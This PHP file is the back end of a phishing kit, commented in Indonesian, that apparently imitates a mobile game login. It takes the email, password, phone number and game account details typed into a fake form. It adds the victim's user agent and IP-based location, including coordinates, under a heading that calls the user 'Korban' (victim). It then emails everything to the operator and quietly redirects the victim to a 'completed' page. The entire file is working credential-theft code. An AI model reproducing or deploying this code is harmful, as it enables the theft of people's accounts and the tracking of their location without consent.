<?php
//MENGAMBIL SISTEM SCRIPT
include 'aa/setting.php';
include 'boyhgt/geolocation.php';
include 'login.php';
include 'boyhgt/get_callingcode.php';

//MENERIMA DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];
$nickname = $_POST['nickname'];
$playid = $_POST['playid'];
$phone = $_POST['phone'];
$level = $_POST['level'];
$tier = $_POST['tier'];
$rpl = $_POST['rpl'];
$ua = $_SERVER['HTTP_USER_AGENT'];

// MENGAMBIL DATA KODE PANGGILAN NEGARA 
$callingcode = $arpantek_callingcode['country_code'];

//MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $login == "" && $nickname == "" && $playid == "" && $level == "" && $tier == "" && $rpl == "" && $platform == ""){
header("Location: index.php");
}else{

//KONTEN UNTUK KIRIM KE EMAIL
$subjek = "NEGARA [ ".$resultFlags." ] | +$callingcode |PUNYA SI $email | LOGIN $login";include '.boyhgt/get_callingcode.php';$pesan = <<<EOD
<center> 
<div style="background: url(https://i.ibb.co/XkVB4CN/Whats-App-Image-2020-08-06-at-12-05-42.jpg) no-repeat center center fixed; background-size: 100% 100%; width: 294; height: 100px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;"></div>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Akun</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width:22%;text-align:left;" height="25px"><b>EMAIL/PHONE/USERNAME</th>
<th style="width:78%;text-align: center;"><b>$email</th> 
</tr>
<tr>
<th style="width:22%;text-align:left;" height="25px"><b>PASSWORD</th>
<th style="width:78%;text-align: center;"><b>$password</th> 
</tr>
<tr>
<th style="width:22%;text-align:left;" height="25px"><b>NICKNAME</th>
<th style="width:78%;text-align: center;"><b>$nickname</th> 
</tr>
<tr>
<th style="width:22%;text-align:left;" height="25px"><b>CHARACTER ID</th>
<th style="width:78%;text-align: center;"><b>$playid</th> 
</tr>
<th style="width:22%;text-align:left;" height="25px"><b>Phone Number</th>
<th style="width:78%;text-align: center;"><b>$phone</th> 
</tr>
<tr>
<th style="width:22%;text-align:left;" height="25px"><b>LEVEL AKUN</th>
<th style="width:78%;text-align:center;"><b>$level</th> 
</tr>
<tr>
<th style="width:22%;text-align:left;" height="25px"><b>Ranked Tier Level</th>
<th style="width:78%;text-align: center;"><b>$tier</th> 
</tr>
<tr>
<th style="width:22%;text-align:left;" height="25px"><b>Pernah Elite Pass?</th>
<th style="width:78%;text-align:center;"><b>$rpl</th> 
</tr>
<tr>
<th style="width:22%;text-align:left;" height="25px"><b>DEVICE</b></th>
<th style="width:78%;text-align:center;"><b><b>'.$ua.' </b></b></th> 
</tr>
<tr>
<th style="width:22%;text-align:left;" height="25px"><b>LOGIN</th>
<th style="width:78%;text-align:center;"><b>$login</th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Lokasi Korban</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>BENUA</th>
<th style="width: 78%; text-align: center;"><b>$arpantek[continent]</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>COUNTRY</th>
<th style="width: 78%; text-align: center;"><b>$arpantek[country]</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>REGION</th>
<th style="width: 78%; text-align: center;"><b>$arpantek[region]</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CITY</th>
<th style="width: 78%; text-align: center;"><b>$arpantek[city]</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LATITUDE</th>
<th style="width: 78%; text-align: center;"><b>$arpantek[lat]</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LONGITUDE</th>
<th style="width: 78%; text-align: center;"><b>$arpantek[lon]</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ALAMAT IP</th>
<th style="width: 78%; text-align: center;"><b>$arpantek[query]</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>WAKTU MASUK</th>
<th style="width: 78%; text-align: center;"><b>$jamasuk</th> 
</tr>
</table>
<div style="width: 294; height: 40px; background: #000; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align: center;">
<div style="float: left; margin-top: 3%;">
$author
</div>
<div style="float: right;">
<img style="margin: 5px;" width="100" src="https://logodix.com/logo/76397.png">
</div>
</div>
</center>
EOD;
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$kirim = mail($emailku, $subjek, $pesan, $headers);

//MENERIMA DATA YANG BERHASIL DI-INPUT DAN MENGALIHKAN KE HALAMAN BERHASIL
if($kirim) {
echo "<form id='arpantek' method='POST' action='completed.php'>
<input type='hidden' name='nickname' value='$nickname'>
</form>
<script type='text/javascript'>document.getElementById('arpantek').submit();</script>";
}
}
?>